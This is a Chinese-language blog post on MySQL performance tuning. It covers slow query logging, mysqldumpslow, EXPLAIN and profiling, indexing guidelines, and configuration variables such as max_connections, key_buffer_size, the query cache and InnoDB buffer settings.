<h2 id="1-性能瓶颈定位"><a href="#1-性能瓶颈定位" class="headerlink" title="1 性能瓶颈定位"></a>1 性能瓶颈定位</h2><h3 id="Show命令"><a href="#Show命令" class="headerlink" title="Show命令"></a>Show命令</h3><p>我们可以通过show命令查看MySQL状态及变量，找到系统的瓶颈：</p>
<p>Mysql&gt; show status ——显示状态信息（扩展show status like ‘XXX’）</p>
<p>Mysql&gt; show variables ——显示系统变量（扩展show variables like ‘XXX’）</p>
<p>Mysql&gt; show innodb status ——显示InnoDB存储引擎的状态</p>
<p>Mysql&gt; show processlist ——查看当前SQL执行，包括执行状态、是否锁表等</p>
<p>Shell&gt; mysqladmin variables -u username -p password——显示系统变量</p>
<p>Shell&gt; mysqladmin extended-status -u username -p password——显示状态信息</p>
<p>查看状态变量及帮助：</p>
<p>Shell&gt; mysqld –verbose –help [|more #逐行显示]</p>
<p>比较全的Show命令的使用可参考： <a href="http://blog.phpbean.com/a.cn/18/" target="_blank" rel="external">http://blog.phpbean.com/a.cn/18/</a></p>
<h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p><strong>慢查询日志开启：</strong></p>
<p>在配置文件my.cnf或my.ini中在[mysqld]一行下面加入两个配置参数</p>
<p>log-slow-queries=/data/mysqldata/slow-query.log</p>
<p>long_query_time=2</p>
<p>注：log-slow-queries参数为慢查询日志存放的位置，一般这个目录要有mysql的运行帐号的可写权限，一般都将这个目录设置为mysql的数据存放目录；</p>
<p>long_query_time=2中的2表示查询超过两秒才记录；</p>
<p>在my.cnf或者my.ini中添加log-queries-not-using-indexes参数，表示记录下没有使用索引的查询。</p>
<p>log-slow-queries=/data/mysqldata/slow-query.log</p>
<p>long_query_time=10</p>
<p>log-queries-not-using-indexes</p>
<p><strong>慢查询日志开启方法二：</strong></p>
<p>我们可以通过命令行设置变量来即时启动慢日志查询。由下图可知慢日志没有打开，slow_launch_time=# 表示如果建立线程花费了比这个值更长的时间,slow_launch_threads 计数器将增加</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/2.png" alt="2"></a></p>
<p>设置慢日志开启</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/3.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/3.png" alt="3"></a></p>
<p>MySQL后可以查询long_query_time 的值 。</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/4.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/4.png" alt="4"></a></p>
<p>为了方便测试，可以将修改慢查询时间为5秒。</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/5.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/5.png" alt="5"></a></p>
<p><strong>慢查询分析mysqldumpslow</strong></p>
<p>我们可以通过打开log文件查看得知哪些SQL执行效率低下</p>
<p>[root@localhost mysql]# more slow-query.log</p>
<h1 id="Time-081026-19-46-34"><a href="#Time-081026-19-46-34" class="headerlink" title="Time: 081026 19:46:34"></a>Time: 081026 19:46:34</h1><h1 id="User-Host-root-root-localhost"><a href="#User-Host-root-root-localhost" class="headerlink" title="User@Host: root[root] @ localhost []"></a>User@Host: root[root] @ localhost []</h1><h1 id="Query-time-11-Lock-time-0-Rows-sent-1-Rows-examined-6552961"><a href="#Query-time-11-Lock-time-0-Rows-sent-1-Rows-examined-6552961" class="headerlink" title="Query_time: 11 Lock_time: 0 Rows_sent: 1 Rows_examined: 6552961"></a>Query_time: 11 Lock_time: 0 Rows_sent: 1 Rows_examined: 6552961</h1><p>select count(*) from t_user;</p>
<p>从日志中，可以发现查询时间超过5 秒的SQL，而小于5秒的没有出现在此日志中。</p>
<p>如果慢查询日志中记录内容很多，可以使用mysqldumpslow工具（MySQL客户端安装自带）来对慢查询日志进行分类汇总。mysqldumpslow对日志文件进行了分类汇总，显示汇总后摘要结果。</p>
<p>进入log的存放目录，运行</p>
<p>[root@mysql_data]#mysqldumpslow  slow-query.log</p>
<p>Reading mysql slow query log from slow-query.log</p>
<p>Count: 2 Time=11.00s (22s) Lock=0.00s (0s) Rows=1.0 (2), root[root]@mysql</p>
<p>select count(N) from t_user;</p>
<p>mysqldumpslow命令</p>
<p>/path/mysqldumpslow -s c -t 10 /database/mysql/slow-query.log</p>
<p>这会输出记录次数最多的10条SQL语句，其中：</p>
<p>-s, 是表示按照何种方式排序，c、t、l、r分别是按照记录次数、时间、查询时间、返回的记录数来排序，ac、at、al、ar，表示相应的倒叙；</p>
<p>-t, 是top n的意思，即为返回前面多少条的数据；</p>
<p>-g, 后边可以写一个正则匹配模式，大小写不敏感的；</p>
<p>例如：</p>
<p>/path/mysqldumpslow -s r -t 10 /database/mysql/slow-log</p>
<p>得到返回记录集最多的10个查询。</p>
<p>/path/mysqldumpslow -s t -t 10 -g “left join” /database/mysql/slow-log</p>
<p>得到按照时间排序的前10条里面含有左连接的查询语句。</p>
<p>使用mysqldumpslow命令可以非常明确的得到各种我们需要的查询语句，对MySQL查询语句的监控、分析、优化是MySQL优化非常重要的一步。开启慢查询日志后，由于日志记录操作，在一定程度上会占用CPU资源影响mysql的性能，但是可以阶段性开启来定位性能瓶颈。</p>
<h3 id="explain分析查询"><a href="#explain分析查询" class="headerlink" title="explain分析查询"></a>explain分析查询</h3><p>使用 EXPLAIN 关键字可以模拟优化器执行SQL查询语句，从而知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。通过explain命令可以得到:</p>
<p>– 表的读取顺序</p>
<p>– 数据读取操作的操作类型</p>
<p>– 哪些索引可以使用</p>
<p>– 哪些索引被实际使用</p>
<p>– 表之间的引用</p>
<p>– 每张表有多少行被优化器查询</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/6.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/6.png" alt="6"></a></p>
<p>EXPLAIN字段：</p>
<p>ØTable：显示这一行的数据是关于哪张表的</p>
<p>Øpossible_keys：显示可能应用在这张表中的索引。如果为空，没有可能的索引。可以为相关的域从WHERE语句中选择一个合适的语句</p>
<p>Økey：实际使用的索引。如果为NULL，则没有使用索引。MYSQL很少会选择优化不足的索引，此时可以在SELECT语句中使用USE INDEX（index）来强制使用一个索引或者用IGNORE INDEX（index）来强制忽略索引</p>
<p>Økey_len：使用的索引的长度。在不损失精确性的情况下，长度越短越好</p>
<p>Øref：显示索引的哪一列被使用了，如果可能的话，是一个常数</p>
<p>Ørows：MySQL认为必须检索的用来返回请求数据的行数</p>
<p>Øtype：这是最重要的字段之一，显示查询使用了何种类型。从最好到最差的连接类型为system、const、eq_reg、ref、range、index和ALL</p>
<p>nsystem、const：可以将查询的变量转为常量.  如id=1; id为 主键或唯一键.</p>
<p>neq_ref：访问索引,返回某单一行的数据.(通常在联接时出现，查询使用的索引为主键或惟一键)</p>
<p>nref：访问索引,返回某个值的数据.(可以返回多行) 通常使用=时发生</p>
<p>nrange：这个连接类型使用索引返回一个范围中的行，比如使用&gt;或&lt;查找东西，并且该字段上建有索引时发生的情况(注:不一定好于index)</p>
<p>nindex：以索引的顺序进行全表扫描，优点是不用排序,缺点是还要全表扫描</p>
<p>nALL：全表扫描，应该尽量避免</p>
<p>ØExtra：关于MYSQL如何解析查询的额外信息，主要有以下几种</p>
<p>nusing index：只用到索引,可以避免访问表.</p>
<p>nusing where：使用到where来过虑数据. 不是所有的where clause都要显示using where. 如以=方式访问索引.</p>
<p>nusing tmporary：用到临时表</p>
<p>nusing filesort：用到额外的排序. (当使用order by v1,而没用到索引时,就会使用额外的排序)</p>
<p>nrange checked for eache record(index map:N)：没有好的索引.</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/7.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/7.png" alt="7"></a></p>
<p>&nbsp;</p>
<h3 id="profiling分析查询"><a href="#profiling分析查询" class="headerlink" title="profiling分析查询"></a>profiling分析查询</h3><p>通过慢日志查询可以知道哪些SQL语句执行效率低下，通过explain我们可以得知SQL语句的具体执行情况，索引使用等，还可以结合show命令查看执行状态。</p>
<p>如果觉得explain的信息不够详细，可以同通过profiling命令得到更准确的SQL执行消耗系统资源的信息。</p>
<p>profiling默认是关闭的。可以通过以下语句查看</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/11.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/11.png" alt="11"></a></p>
<p>&nbsp;</p>
<p>打开功能： mysql&gt;set profiling=1; 执行需要测试的sql 语句：</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/12.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/12.png" alt="12"></a></p>
<p>mysql&gt; show profilesG; 可以得到被执行的SQL语句的时间和ID</p>
<p>mysql&gt;show profile for query 1; 得到对应SQL语句执行的详细信息</p>
<p>Show Profile命令格式：</p>
<p>SHOW PROFILE [type [, type] … ]</p>
<p>[FOR QUERY n]</p>
<p>[LIMIT row_count [OFFSET offset]]</p>
<p>type:</p>
<p>ALL</p>
<p>| BLOCK IO</p>
<p>| CONTEXT SWITCHES</p>
<p>| CPU</p>
<p>| IPC</p>
<p>| MEMORY</p>
<p>| PAGE FAULTS</p>
<p>| SOURCE</p>
<p>| SWAPS</p>
<p>以上的16rows是针对非常简单的select语句的资源信息，对于较复杂的SQL语句，会有更多的行和字段，比如converting HEAP to MyISAM 、Copying to tmp table等等，由于以上的SQL语句不存在复杂的表操作，所以未显示这些字段。通过profiling资源耗费信息，我们可以采取针对性的优化措施。</p>
<p>测试完毕以后 ，关闭参数：mysql&gt; set profiling=</p>
<p><strong>2     索引及查询优化</strong></p>
<p><strong>索引的类型</strong></p>
<p>Ø 普通索引：这是最基本的索引类型，没唯一性之类的限制。</p>
<p>Ø 唯一性索引：和普通索引基本相同，但所有的索引列值保持唯一性。</p>
<p>Ø 主键：主键是一种唯一索引，但必须指定为”PRIMARY KEY”。</p>
<p>Ø 全文索引：MYSQL从3.23.23开始支持全文索引和全文检索。在MYSQL中，全文索引的索引类型为FULLTEXT。全文索引可以在VARCHAR或者TEXT类型的列上创建。</p>
<p>大多数MySQL索引(PRIMARY KEY、UNIQUE、INDEX和FULLTEXT)使用B树中存储。空间列类型的索引使用R-树，MEMORY表支持hash索引。</p>
<p><strong>单列索引和多列索引（复合索引）</strong></p>
<p>索引可以是单列索引，也可以是多列索引。对相关的列使用索引是提高SELECT操作性能的最佳途径之一。</p>
<p><strong>多列索引：</strong></p>
<p>MySQL可以为多个列创建索引。一个索引可以包括15个列。对于某些列类型，可以索引列的左前缀，列的顺序非常重要。</p>
<p>多列索引可以视为包含通过连接索引列的值而创建的值的排序的数组。一般来说，即使是限制最严格的单列索引，它的限制能力也远远低于多列索引。</p>
<p><strong>最左前缀</strong></p>
<p>多列索引有一个特点，即最左前缀（Leftmost Prefixing）。假如有一个多列索引为key(firstname lastname age)，当搜索条件是以下各种列的组合和顺序时，MySQL将使用该多列索引：</p>
<p>firstname，lastname，age</p>
<p>firstname，lastname</p>
<p>firstname</p>
<p>也就是说，相当于还建立了key(firstname lastname)和key(firstname)。</p>
<p>索引主要用于下面的操作：</p>
<p>Ø 快速找出匹配一个WHERE子句的行。</p>
<p>Ø 删除行。当执行联接时，从其它表检索行。</p>
<p>Ø 对具体有索引的列key_col找出MAX()或MIN()值。由预处理器进行优化，检查是否对索引中在key_col之前发生所有关键字元素使用了WHERE key<em>part</em># = constant。在这种情况下，MySQL为每个MIN()或MAX()表达式执行一次关键字查找，并用常数替换它。如果所有表达式替换为常量，查询立即返回。例如：</p>
<p>SELECT MIN(key2), MAX (key2)  FROM tb WHERE key1=10;</p>
<p>Ø 如果对一个可用关键字的最左面的前缀进行了排序或分组(例如，ORDER BY key_part_1,key_part_2)，排序或分组一个表。如果所有关键字元素后面有DESC，关键字以倒序被读取。</p>
<p>Ø 在一些情况中，可以对一个查询进行优化以便不用查询数据行即可以检索值。如果查询只使用来自某个表的数字型并且构成某些关键字的最左面前缀的列，为了更快，可以从索引树检索出值。</p>
<p>SELECT key_part3 FROM tb WHERE key_part1=1</p>
<p>有时MySQL不使用索引，即使有可用的索引。一种情形是当优化器估计到使用索引将需要MySQL访问表中的大部分行时。(在这种情况下，表扫描可能会更快些）。然而，如果此类查询使用LIMIT只搜索部分行，MySQL则使用索引，因为它可以更快地找到几行并在结果中返回。例如：</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/20111020040827120.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/20111020040827120.png" alt="20111020040827120"></a></p>
<p><strong>合理的建立索引**</strong>的建议：**</p>
<p>(1)  越小的数据类型通常更好：越小的数据类型通常在磁盘、内存和CPU缓存中都需要更少的空间，处理起来更快。</p>
<p>(2)  简单的数据类型更好：整型数据比起字符，处理开销更小，因为字符串的比较更复杂。在MySQL中，应该用内置的日期和时间数据类型，而不是用字符串来存储时间；以及用整型数据类型存储IP地址。</p>
<p>(3)  尽量避免NULL：应该指定列为NOT NULL，除非你想存储NULL。在MySQL中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值</p>
<p>这部分是关于索引和写SQL语句时应当注意的一些琐碎建议和注意点。</p>
<p><strong>1. **</strong>当结果集只有一行数据时使用<strong>**LIMIT 1</strong></p>
<p><strong>2. **</strong>避免<strong><strong>SELECT *</strong></strong>，始终指定你需要的列**</p>
<p>从表中读取越多的数据，查询会变得更慢。他增加了磁盘需要操作的时间，还是在数据库服务器与WEB服务器是独立分开的情况下。你将会经历非常漫长的网络延迟，仅仅是因为数据不必要的在服务器之间传输。</p>
<p><strong>3. **</strong>使用连接（<strong><strong>JOIN</strong></strong>）来代替子查询<strong>**(Sub-Queries)</strong></p>
<p>连接（JOIN）.. 之所以更有效率一些，是因为MySQL不需要在内存中创建临时表来完成这个逻辑上的需要两个步骤的查询工作。</p>
<p><strong>4. **</strong>使用<strong><strong>ENUM</strong></strong>、<strong><strong>CHAR </strong></strong>而不是<strong><strong>VARCHAR</strong></strong>，使用合理的字段属性长度**</p>
<p><strong>5. **</strong>尽可能的使用<strong>**NOT NULL</strong></p>
<p><strong>6. **</strong>固定长度的表会更快**</p>
<p><strong>7. **</strong>拆分大的<strong><strong>DELETE </strong></strong>或<strong><strong>INSERT </strong></strong>语句**</p>
<p><strong>8. **</strong>查询的列越小越快**</p>
<p>Where条件</p>
<p>在查询中，WHERE条件也是一个比较重要的因素，尽量少并且是合理的where条件是很重要的，尽量在<strong>多个条件的时候，把会提取尽量少数据量的条件放在前面，减少后一个where条件的查询时间。</strong></p>
<p>有些where条件会导致索引无效：</p>
<p>Ø where子句的查询条件里有！=，MySQL将无法使用索引。</p>
<p>Ø where子句使用了Mysql函数的时候，索引将无效，比如：select * from tb where left(name, 4) = ‘xxx’</p>
<p>Ø 使用LIKE进行搜索匹配的时候，这样<strong>索引是有效的：select * from tbl1 where name like ‘xxx%’，而like ‘%xxx%’ 时索引无效</strong></p>
<p>三、    配置优化</p>
<p>安装MySQL后，配置文件my.cnf在 /MySQL安装目录/share/mysql目录中，该目录中还包含多个配置文件可供参考，有my-large.cnf ，my-huge.cnf，  my-medium.cnf，my-small.cnf，分别对应大中小型数据库应用的配置。win环境下即存在于MySQL安装目录中的.ini文件。</p>
<p>下面列出了对性能优化影响较大的主要变量，主要分为连接请求的变量和缓冲区变量。</p>
<p><strong><em>1.   </em>**</strong><em>连接请求的变量：</em>**</p>
<h2 id="1-max-connections"><a href="#1-max-connections" class="headerlink" title="1)     max_connections"></a>1)     max_connections</h2><p>MySQL的最大连接数，增加该值增加mysqld 要求的文件描述符的数量。如果服务器的并发连接请求量比较大，建议调高此值，以增加并行连接数量，当然这建立在机器能支撑的情况下，因为如果连接数越多，介于MySQL会为每个连接提供连接缓冲区，就会开销越多的内存，所以要适当调整该值，不能盲目提高设值。</p>
<p>数值过小会经常出现ERROR 1040: Too many connections错误，可以过’conn%’通配符查看当前状态的连接数量，以定夺该值的大小。</p>
<p>show variables like ‘max_connections’ 最大连接数</p>
<p>show  status like ‘max_used_connections’响应的连接数</p>
<p>如下：</p>
<p>mysql&gt; show variables like ‘max_connections‘;</p>
<p>+———————–+——-+</p>
<p>| Variable_name　| Value |</p>
<p>+———————–+——-+</p>
<p>| max_connections | 256　　|</p>
<p>+———————–+——-+</p>
<p>mysql&gt; show status like ‘max%connections‘;</p>
<p>+———————–+——-+</p>
<p>| Variable_name　      | Value |</p>
<p>+—————————-+——-+</p>
<p>| max_used_connections | 256|</p>
<p>+—————————-+——-+</p>
<p>max_used_connections / max_connections * 100% （理想值≈ 85%）</p>
<p>如果max_used_connections跟max_connections相同 那么就是max_connections设置过低或者超过服务器负载上限了，低于10%则设置过大。</p>
<h2 id="2-back-log"><a href="#2-back-log" class="headerlink" title="2)     back_log"></a>2)     back_log</h2><p>MySQL能暂存的连接数量。当主要MySQL线程在一个很短时间内得到非常多的连接请求，这就起作用。如果MySQL的连接数据达到max_connections时，新来的请求将会被存在堆栈中，以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量超过back_log，将不被授予连接资源。</p>
<p>back_log值指出在MySQL暂时停止回答新请求之前的短时间内有多少个请求可以被存在堆栈中。只有如果期望在一个短时间内有很多连接，你需要增加它，换句话说，这值对到来的TCP/IP连接的侦听队列的大小。</p>
<p>当观察你主机进程列表（mysql&gt; show full processlist），发现大量264084 | unauthenticated user | xxx.xxx.xxx.xxx | NULL | Connect | NULL | login | NULL 的待连接进程时，就要加大back_log 的值了。</p>
<p>默认数值是50，可调优为128，对于<a href="http://www.2cto.com/os/linux/" target="_blank" rel="external">Linux</a>系统设置范围为小于512的整数。</p>
<h2 id="3-interactive-timeout"><a href="#3-interactive-timeout" class="headerlink" title="3)     interactive_timeout"></a>3)     interactive_timeout</h2><p>一个交互连接在被服务器在关闭前等待行动的秒数。一个交互的客户被定义为对mysql_real_connect()使用CLIENT_INTERACTIVE 选项的客户。</p>
<p>默认数值是28800，可调优为7200。</p>
<p><strong><em>2.   </em>**</strong><em>缓冲区变量</em>**</p>
<p><strong>全局缓冲：</strong></p>
<h2 id="4-key-buffer-size"><a href="#4-key-buffer-size" class="headerlink" title="4)     key_buffer_size"></a>4)     key_buffer_size</h2><p>key_buffer_size指定索引缓冲区的大小，它决定索引处理的速度，尤其是索引读的速度。通过检查状态值Key_read_requests和Key_reads，可以知道key_buffer_size设置是否合理。比例key_reads / key_read_requests应该尽可能的低，至少是1:100，1:1000更好（上述状态值可以使用SHOW STATUS LIKE ‘key_read%’获得）。</p>
<p>key_buffer_size只对MyISAM表起作用。即使你不使用MyISAM表，但是内部的临时磁盘表是MyISAM表，也要使用该值。可以使用检查状态值created_tmp_disk_tables得知详情。</p>
<p>举例如下：</p>
<p>mysql&gt; show variables like ‘key_buffer_size‘;</p>
<p>+——————-+————+</p>
<p>| Variable_name | Value      |</p>
<p>+———————+————+</p>
<p>| key_buffer_size | 536870912 |</p>
<p>+———— ———-+————+</p>
<p>key_buffer_size为512MB，我们再看一下key_buffer_size的使用情况：</p>
<p>mysql&gt; show global status like ‘key_read%‘;</p>
<p>+————————+————-+</p>
<p>| Variable_name　  | Value    |</p>
<p>+————————+————-+</p>
<p>| Key_read_requests| 27813678764 |</p>
<p>| Key_reads　　　|  6798830      |</p>
<p>+————————+————-+</p>
<p>一共有27813678764个索引读取请求，有6798830个请求在内存中没有找到直接从硬盘读取索引，计算索引未命中缓存的概率：</p>
<p>key_cache_miss_rate ＝Key_reads / Key_read_requests * 100%，设置在1/1000左右较好</p>
<p>默认配置数值是8388600(8M)，主机有4GB内存，可以调优值为268435456(256MB)。</p>
<h2 id="5-query-cache-size"><a href="#5-query-cache-size" class="headerlink" title="5)     query_cache_size"></a>5)     query_cache_size</h2><p>使用查询缓冲，MySQL将查询结果存放在缓冲区中，今后对于同样的SELECT语句（区分大小写），将直接从缓冲区中读取结果。</p>
<p>通过检查状态值Qcache_*，可以知道query_cache_size设置是否合理（上述状态值可以使用SHOW STATUS LIKE ‘Qcache%’获得）。如果Qcache_lowmem_prunes的值非常大，则表明经常出现缓冲不够的情况，如果Qcache_hits的值也非常大，则表明查询缓冲使用非常频繁，此时需要增加缓冲大小；如果Qcache_hits的值不大，则表明你的查询重复率很低，这种情况下使用查询缓冲反而会影响效率，那么可以考虑不用查询缓冲。此外，在SELECT语句中加入SQL_NO_CACHE可以明确表示不使用查询缓冲。</p>
<p>&nbsp;</p>
<p>与查询缓冲有关的参数还有query_cache_type、query_cache_limit、query_cache_min_res_unit。</p>
<p>&nbsp;</p>
<p>query_cache_type指定是否使用查询缓冲，可以设置为0、1、2，该变量是SESSION级的变量。</p>
<p>query_cache_limit指定单个查询能够使用的缓冲区大小，缺省为1M。</p>
<p>query_cache_min_res_unit是在4.1版本以后引入的，它指定分配缓冲区空间的最小单位，缺省为4K。检查状态值Qcache_free_blocks，如果该值非常大，则表明缓冲区中碎片很多，这就表明查询结果都比较小，此时需要减小query_cache_min_res_unit。</p>
<p>举例如下：</p>
<p>mysql&gt; show global status like ‘qcache%‘;</p>
<p>+——————————-+—————–+</p>
<p>| Variable_name                  | Value　       |</p>
<p>+——————————-+—————–+</p>
<p>| Qcache_free_blocks　       | 22756　      |</p>
<p>| Qcache_free_memory　    | 76764704    |</p>
<p>| Qcache_hits　　　　　      | 213028692 |</p>
<p>| Qcache_inserts　　　　     | 208894227   |</p>
<p>| Qcache_lowmem_prunes   | 4010916      |</p>
<p>| Qcache_not_cached　| 13385031    |</p>
<p>| Qcache_queries_in_cache | 43560　|</p>
<p>| Qcache_total_blocks          | 111212　     |</p>
<p>+——————————-+—————–+</p>
<p>mysql&gt; show variables like ‘query_cache%‘;</p>
<p>+————————————–+————–+</p>
<p>| Variable_name　　　　　       | Value　     |</p>
<p>+————————————–+———–+</p>
<p>| query_cache_limit　　　　　    | 2097152     |</p>
<p>| query_cache_min_res_unit　     | 4096　　  |</p>
<p>| query_cache_size　　　　　    | 203423744 |</p>
<p>| query_cache_type　　　　　   | ON　          |</p>
<p>| query_cache_wlock_invalidate | OFF　  |</p>
<p>+————————————–+—————+</p>
<p>查询缓存碎片率= Qcache_free_blocks / Qcache_total_blocks * 100%</p>
<p>如果查询缓存碎片率超过20%，可以用FLUSH QUERY CACHE整理缓存碎片，或者试试减小query_cache_min_res_unit，如果你的查询都是小数据量的话。</p>
<p>查询缓存利用率= (query_cache_size – Qcache_free_memory) / query_cache_size * 100%</p>
<p>查询缓存利用率在25%以下的话说明query_cache_size设置的过大，可适当减小；查询缓存利用率在80％以上而且Qcache_lowmem_prunes &gt; 50的话说明query_cache_size可能有点小，要不就是碎片太多。</p>
<p>查询缓存命中率= (Qcache_hits – Qcache_inserts) / Qcache_hits * 100%</p>
<p>示例服务器查询缓存碎片率＝20.46％，查询缓存利用率＝62.26％，查询缓存命中率＝1.94％，命中率很差，可能写操作比较频繁吧，而且可能有些碎片。</p>
<p><strong>每个连接的缓冲</strong></p>
<h2 id="6-record-buffer-size"><a href="#6-record-buffer-size" class="headerlink" title="6)    record_buffer_size"></a>6)    record_buffer_size</h2><p>每个进行一个顺序扫描的线程为其扫描的每张表分配这个大小的一个缓冲区。如果你做很多顺序扫描，你可能想要增加该值。</p>
<p>默认数值是131072(128K)，可改为16773120 (16M)</p>
<h2 id="7-read-rnd-buffer-size"><a href="#7-read-rnd-buffer-size" class="headerlink" title="7)     read_rnd_buffer_size"></a>7)     read_rnd_buffer_size</h2><p>随机读缓冲区大小。当按任意顺序读取行时(例如，按照排序顺序)，将分配一个随机读缓存区。进行排序查询时，MySQL会首先扫描一遍该缓冲，以避免磁盘搜索，提高查询速度，如果需要排序大量数据，可适当调高该值。但MySQL会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大。</p>
<p>一般可设置为16M</p>
<h2 id="8-sort-buffer-size"><a href="#8-sort-buffer-size" class="headerlink" title="8)     sort_buffer_size"></a>8)     sort_buffer_size</h2><p>每个需要进行排序的线程分配该大小的一个缓冲区。增加这值加速ORDER BY或GROUP BY操作。</p>
<p>默认数值是2097144(2M)，可改为16777208 (16M)。</p>
<h2 id="9-join-buffer-size"><a href="#9-join-buffer-size" class="headerlink" title="9)     join_buffer_size"></a>9)     join_buffer_size</h2><p>联合查询操作所能使用的缓冲区大小</p>
<p><strong>record_buffer_size**</strong>，read_rnd_buffer_size，sort_buffer_size，join_buffer_size为每个线程独占，也就是说，如果有100个线程连接，则占用为16M<em>100*</em></p>
<h2 id="10-table-cache"><a href="#10-table-cache" class="headerlink" title="10)  table_cache"></a>10)  table_cache</h2><p>表高速缓存的大小。每当MySQL访问一个表时，如果在表缓冲区中还有空间，该表就被打开并放入其中，这样可以更快地访问表内容。<strong>通过检查峰值时间的状态值</strong>Open_tables<strong>和</strong>Opened_tables<strong>，可以决定是否需要增加</strong>table_cache<strong>的值。</strong>如果你发现open_tables等于table_cache，并且opened_tables在不断增长，那么你就需要增加table_cache的值了（上述状态值可以使用SHOW STATUS LIKE ‘Open%tables’获得）。注意，不能盲目地把table_cache设置成很大的值。如果设置得太高，可能会造成文件描述符不足，从而造成性能不稳定或者连接失败。</p>
<p>1G内存机器，推荐值是128－256。内存在4GB左右的服务器该参数可设置为256M或384M。</p>
<h2 id="11-max-heap-table-size"><a href="#11-max-heap-table-size" class="headerlink" title="11)  max_heap_table_size"></a>11)  max_heap_table_size</h2><p>用户可以创建的内存表(memory table)的大小。这个值用来计算内存表的最大行数值。这个变量支持动态改变，即set @max_heap_table_size=#</p>
<p>这个变量和tmp_table_size一起限制了内部内存表的大小。如果某个内部heap（堆积）表大小超过tmp_table_size，MySQL可以根据需要自动将内存中的heap表改为基于硬盘的MyISAM表。</p>
<h2 id="12-tmp-table-size"><a href="#12-tmp-table-size" class="headerlink" title="12)  tmp_table_size"></a>12)  tmp_table_size</h2><p>通过设置tmp_table_size选项来增加一张临时表的大小，例如做高级GROUP BY操作生成的临时表。如果调高该值，MySQL同时将增加heap表的大小，可达到提高联接查询速度的效果，<strong>建议尽量优化查询，要确保查询过程中生成的临时表在内存中，避免临时表过大导致生成基于硬盘的MyISAM表</strong>。</p>
<p>mysql&gt; show global status like ‘created_tmp%‘;</p>
<p>+——————————–+———+</p>
<p>| Variable_name　　           | Value　|</p>
<p>+———————————-+———+</p>
<p>| Created_tmp_disk_tables | 21197  |</p>
<p>| Created_tmp_files　　　| 58　　|</p>
<p>| Created_tmp_tables　　| 1771587 |</p>
<p>+——————————–+———–+</p>
<p>每次创建临时表，Created_tmp_tables增加，如果临时表大小超过tmp_table_size，则是在磁盘上创建临时表，Created_tmp_disk_tables也增加,Created_tmp_files表示MySQL服务创建的临时文件文件数，比较理想的配置是：</p>
<p>Created_tmp_disk_tables / Created_tmp_tables <em> 100% &lt;= 25%比如上面的服务器Created_tmp_disk_tables / Created_tmp_tables </em> 100% ＝1.20%，应该相当好了</p>
<p>默认为16M，可调到64-256最佳，线程独占，太大可能内存不够I/O堵塞</p>
<h2 id="13-thread-cache-size"><a href="#13-thread-cache-size" class="headerlink" title="13)  thread_cache_size"></a>13)  thread_cache_size</h2><p>可以复用的保存在中的线程的数量。如果有，新的线程从缓存中取得，当断开连接的时候如果有空间，客户的线置在缓存中。如果有很多新的线程，为了提高性能可以这个变量值。</p>
<p>通过比较 Connections和Threads_created状态的变量，可以看到这个变量的作用。</p>
<p>默认值为110，可调优为80。</p>
<h2 id="14-thread-concurrency"><a href="#14-thread-concurrency" class="headerlink" title="14)  thread_concurrency"></a>14)  thread_concurrency</h2><p>推荐设置为服务器 CPU核数的2倍，例如双核的CPU, 那么thread_concurrency的应该为4；2个双核的cpu, thread_concurrency的值应为8。默认为8</p>
<h2 id="15-wait-timeout"><a href="#15-wait-timeout" class="headerlink" title="15)  wait_timeout"></a>15)  wait_timeout</h2><p>指定一个请求的最大连接时间，对于4GB左右内存的服务器可以设置为5-10。</p>
<p><em>3.    __配置InnoDB的几个变量</em></p>
<p><strong>innodb_buffer_pool_size</strong></p>
<p>对于InnoDB表来说，innodb_buffer_pool_size的作用就相当于key_buffer_size对于MyISAM表的作用一样。InnoDB使用该参数指定大小的内存来缓冲数据和索引。对于单独的MySQL<a href="http://www.2cto.com/database/" target="_blank" rel="external">数据库</a>服务器，最大可以把该值设置成物理内存的80%。</p>
<p>根据MySQL手册，对于2G内存的机器，推荐值是1G（50%）。</p>
<p><strong>innodb_flush_log_at_trx_commit</strong></p>
<p>主要控制了innodb将log buffer中的数据写入日志文件并flush磁盘的时间点，取值分别为0、1、2三个。0，表示当事务提交时，不做日志写入操作，而是每秒钟将log buffer中的数据写入日志文件并flush磁盘一次；1，则在每秒钟或是每次事物的提交都会引起日志文件写入、flush磁盘的操作，确保了事务的ACID；设置为2，每次事务提交引起写入日志文件的动作，但每秒钟完成一次flush磁盘操作。</p>
<p>实际测试发现，该值对插入数据的速度影响非常大，设置为2时插入10000条记录只需要2秒，设置为0时只需要1秒，而设置为1时则需要229秒。因此，MySQL手册也建议尽量将插入操作合并成一个事务，这样可以大幅提高速度。</p>
<p>根据MySQL手册，在允许丢失最近部分事务的危险的前提下，可以把该值设为0或2。</p>
<p><strong>innodb_log_buffer_size</strong></p>
<p>log缓存大小，一般为1-8M，默认为1M，对于较大的事务，可以增大缓存大小。</p>
<p>可设置为4M或8M。</p>
<p><strong>innodb_additional_mem_pool_size</strong></p>
<p>该参数指定InnoDB用来存储数据字典和其他内部数据结构的内存池大小。缺省值是1M。通常不用太大，只要够用就行，应该与表结构的复杂度有关系。如果不够用，MySQL会在错误日志中写入一条警告信息。</p>
